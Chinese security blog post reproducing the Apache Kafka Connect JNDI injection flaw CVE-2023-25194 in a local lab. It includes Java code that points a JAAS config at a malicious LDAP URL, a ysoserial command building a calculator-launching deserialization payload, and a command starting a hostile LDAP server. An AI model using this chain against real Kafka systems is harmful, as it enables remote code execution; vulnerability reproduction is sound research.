@@ -1,0 +1,386 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194) | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="漏洞描述
+影响版本：2.3.0 &amp;lt;= Apache Kafka Connect &amp;lt;= 3.3.2
+修复建议: 升级至3.4.0版本
+官方链接：https://kafka.apache.org/cve-list
+
+漏洞复现本地先启动kafka server:
+wget https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
+tar -xvf kafka_2.13-3.4.0.tgz
+ 
+//启动zk和kafka
+bin/zookeeper-server-start.sh config/zookeeper.properties
+bin/kafka-server-start.sh config/server.properties
+ 
+//创建一个测试topic
+bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor 1 --partitions 1 --topic test
+
+测试代码import org.apache.kafka.clients.producer.KafkaProducer;
+import org.apache.kafka.clients.producer.Producer;
+import org.apache.kafka.clients.producer.ProducerRecord;
+ 
+import java.util.Properties;
+ 
+public class Main &amp;#123;
+    public static void main(String[] args) &amp;#123;
+        Properties props = new Properties();
+        props.put(&#34;sasl.mechanism&#34;, &#34;SCRAM-SHA-256&#34;);
+        props.put(&#34;security.protocol&#34;, &#34;SASL_SSL&#34;);
+        props.put(&#34;sasl.jaas.config&#34;,&#34;com.sun.security.auth.module.JndiLoginModule &#34;
+                    + &#34;required user.provider.url=\&#34;ldap://0.0.0.0:1389/Exploit\&#34; &#34;
+                    + &#34;useFirstPass=\&#34;true\&#34; serviceName=\&#34;x\&#34; debug=\&#34;true\&#34; &#34;
+                    + &#34;group.provider.url=\&#34;xxx\&#34;;&#34;);
+        props.put(&#34;bootstrap.servers&#34;, &#34;0.0.0.0:9092&#34;);
+        props.put(&#34;key.deserializer&#34;, &#34;org.apache.kafka.common.serialization.StringDeserializer&#34;);
+        props.put(&#34;value.deserializer&#34;, &#34;org.apache.kafka.common.serialization.StringDeserializer&#34;);
+        props.put(&#34;key.serializer&#34;, &#34;org.apache.kafka.common.serialization.StringSerializer&#34;);
+        props.put(&#34;value.serializer&#34;, &#34;org.apache.kafka.common.serialization.StringSerializer&#34;);
+        new Thread(() -&gt; &amp;#123;
+            Producer&amp;lt;String, String&gt; producer = new KafkaProducer&amp;lt;&gt;(props);
+            producer.send(new ProducerRecord&amp;lt;&gt;(&#34;test&#34;, &#34;hello&#34;, &#34;world&#34;));
+            producer.close();
+        &amp;#125;).start();
+    &amp;#125;
+&amp;#125;
+pom.xml文件：
+&amp;lt;dependencies&gt;
+    &amp;lt;dependency&gt;
+        &amp;lt;groupId&gt;org.apache.kafka&amp;lt;/groupId&gt;
+        &amp;lt;artifactId&gt;kafka-clients&amp;lt;/artifactId&gt;
+        &amp;lt;version&gt;3.3.0&amp;lt;/version&gt;
+    &amp;lt;/dependency&gt;
+    &amp;lt;dependency&gt;
+        &amp;lt;groupId&gt;commons-beanutils&amp;lt;/groupId&gt;
+        &amp;lt;artifactId&gt;commons-beanutils&amp;lt;/artifactId&gt;
+        &amp;lt;version&gt;1.8.3&amp;lt;/version&gt;
+    &amp;lt;/dependency&gt;
+&amp;lt;/dependencies&gt;
+
+生成反序列化数据"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul>
+<li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li>
+<li>修复建议: 升级至3.4.0版本</li>
+<li>官方链接：<a target="_blank" rel="noopener" href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
+<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz
+ 
+//启动zk和kafka
+bin/zookeeper-server-start.sh config/zookeeper.properties
+bin/kafka-server-start.sh config/server.properties
+ 
+//创建一个测试topic
+bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>
+                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>
+                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>
+                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>pom.xml文件：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" title="生成反序列化数据"></a>生成反序列化数据</h3><p><code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64|pbcopy</code></p>
+<h3 id="LDAP托管数据"><a href="#LDAP托管数据" class="headerlink" title="LDAP托管数据"></a>LDAP托管数据</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">恶意LDAP</a>修改上一步生成的数据，然后启动：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>运行代码，然后计算器就弹出来了</p>
+<h2 id="测试中的问题"><a href="#测试中的问题" class="headerlink" title="测试中的问题"></a>测试中的问题</h2><p>在反序列化的测试中，尝试了这几种jndi框架，只有第二种可以执行其中命令，但是还不够完美，最后还是用su18师傅的<a target="_blank" rel="noopener" href="https://github.com/su18/ysoserial">su18/ysoserial</a>生成之后用ldap托管靠谱。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Bl0omZ/JNDIEXP">https://github.com/Bl0omZ/JNDIEXP</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/nu1r/JNDIExploit">https://github.com/nu1r/JNDIExploit</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></li>
+</ul>
+<p>考虑到一种黑盒的情形，假如在使用urldns发现存在cb链，攻击的时候可以用ysoserial生成不同的payload多尝试几次。</p>
+
+	</div>
+
+	
+	<span id="/2023/02/14/kafka-rce.html" class="leancloud-visitors view" data-flag-title="Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)">
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/03/03/github-trick.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/02/13/cname-hijack-openresty.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-02-14 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-article-text">漏洞描述</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">漏洞复现</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-article-text">测试代码</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%94%9F%E6%88%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="toc-article-text">生成反序列化数据</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LDAP%E6%89%98%E7%AE%A1%E6%95%B0%E6%8D%AE"><span class="toc-article-text">LDAP托管数据</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-article-text">测试中的问题</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
